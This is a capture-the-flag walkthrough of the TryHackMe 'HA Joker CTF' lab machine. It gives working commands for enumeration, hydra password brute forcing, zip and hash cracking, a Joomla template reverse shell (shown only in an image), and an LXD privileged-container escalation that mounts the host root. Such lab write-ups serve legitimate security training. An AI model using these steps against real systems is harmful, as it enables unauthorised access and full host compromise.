# HA Joker CTF



Room link: https://tryhackme.com/room/jokerctf

## Enumeration 

Nmap 

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.29
```


ffuf

```
css                     [Status: 301, Size: 308, Words: 20, Lines: 10]
img                     [Status: 301, Size: 308, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 5954, Words: 783, Lines: 97]
secret.txt              [Status: 200, Size: 320, Words: 62, Lines: 7]
                        [Status: 200, Size: 5954, Words: 783, Lines: 97]
phpinfo.php             [Status: 200, Size: 94858, Words: 4706, Lines: 1160]
index.html              [Status: 200, Size: 5954, Words: 783, Lines: 97]
```

secret.txt

```
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```

http://10.10.68.63/phpinfo.php

## port 8080 (Brute Force)

basic auth brute force with the user name Joker

```
hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 -f 10.10.68.63 http-get / -f -V 

[8080][http-get] host: 10.10.68.63   login: joker   password: hannah
```

enum the new web directorys

```bash
ffuf -u "http://10.10.68.63:8080//FUZZ" -w  /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt  -c   -mc all  -fc 404,403,301 -e .html,.txt,.php,.zip -H "Authorization: Basic am9rZXI6aGFubmFo"

backup                  [Status: 200, Size: 12133560, Words: 0, Lines: 0]
backup.zip              [Status: 200, Size: 12133560, Words: 0, Lines: 0]
robots.txt              [Status: 200, Size: 836, Words: 88, Lines: 33]
robots                  [Status: 200, Size: 836, Words: 88, Lines: 33]
configuration.php       [Status: 200, Size: 0, Words: 1, Lines: 1]
htaccess                [Status: 200, Size: 3005, Words: 438, Lines: 81]
htaccess.txt            [Status: 200, Size: 3005, Words: 438, Lines: 81]
                        [Status: 200, Size: 10925, Words: 776, Lines: 218]
```


Download the backup file and crack the password

```
$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup                                                    1 ???
possible pw found: hannah ()
```                              

# Crack admin password from backup joomla.sql file. 

![image](https://user-images.githubusercontent.com/5285547/134673619-e5b03ea5-058f-4322-9ec5-4d618df18930.png)


```
echo "$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG" > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash 

abcd1234         (?)
```

![image](https://user-images.githubusercontent.com/5285547/134673748-95bd57b8-85f5-41af-b36b-f402003514c5.png)

```
http://10.10.226.12:8080/administrator/

admin:abcd1234
```

![image](https://user-images.githubusercontent.com/5285547/134674632-7791fc10-dd90-44b0-8f65-d56b0aed1d71.png)

![image](https://user-images.githubusercontent.com/5285547/134674659-80cbb047-fada-4820-9ff4-b1edbd4e5291.png)

## RCE

Add reverse shell to tempalte file

![image](https://user-images.githubusercontent.com/5285547/134676145-80b8d04e-7532-414b-aaf7-fb022bc656dc.png)

Then view template preview to active. 

![image](https://user-images.githubusercontent.com/5285547/134676325-8df76263-2d3a-4e70-84b2-e8286e03c8a6.png)

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo;fg
reset
```

```
lxc image list  
+-------+--------------+--------+-------------+--------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC | DESCRIPTION |  ARCH  |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------+--------+--------+------------------------------+
|       | a8258f4a885f | no     |             | x86_64 | 2.39MB | Oct 25, 2019 at 8:07pm (UTC) |
+-------+--------------+--------+-------------+--------+--------+------------------------------+

```

```
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# copy to the box... 

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

![image](https://user-images.githubusercontent.com/5285547/134677358-f6482879-df85-45f3-8d98-728d05033026.png)


![image](https://user-images.githubusercontent.com/5285547/134677652-80204e01-4dc0-4011-b929-b121eadb6df9.png)


